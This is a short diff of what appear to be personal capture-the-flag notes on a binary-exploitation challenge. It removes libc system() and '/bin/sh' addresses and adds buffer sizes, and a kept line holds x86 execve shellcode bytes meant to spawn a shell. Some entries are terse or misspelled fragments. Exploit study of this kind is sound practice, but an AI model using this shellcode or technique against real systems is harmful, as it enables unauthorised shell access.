@@ -20,15 +20,12 @@ created: 2026-06-24
 - craft shellcode with sh_ file name to make it valid and get shell
 ## 🎯 Information
 
-| Type of information | Data                               |
-| ------------------- | ---------------------------------- |
-| vuln func           | #strc                              |
-| strcmp compare      | #strcmp comrape with `s            |
-| /bin/sh address     | `0xf7f3bde8`<br>`\xe8\xbd\xf3\xf7` |
-| system address      | `0xf7dce8e0`<br>`\xe0\xe8\xdc\xf7` |
-|                     | 0xffffd51b                         |
-| esp addr for arg2   | 0xffffd4b8                         |
-| buffer address      | `0x804c05a`                        |
+| Type of information | Data                           |
+| ------------------- | ------------------------------ |
+| vuln func           | #strc                          |
+| strcmp compare      | #strcmp comrape with `s        |
+| buffer sizes        | 11 for after sh_ and 3 for sh_ |
+
 `\x31\xc0\x50\x68\x63\x6f\x64\x65\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`
 ## 🎯 Tools
 
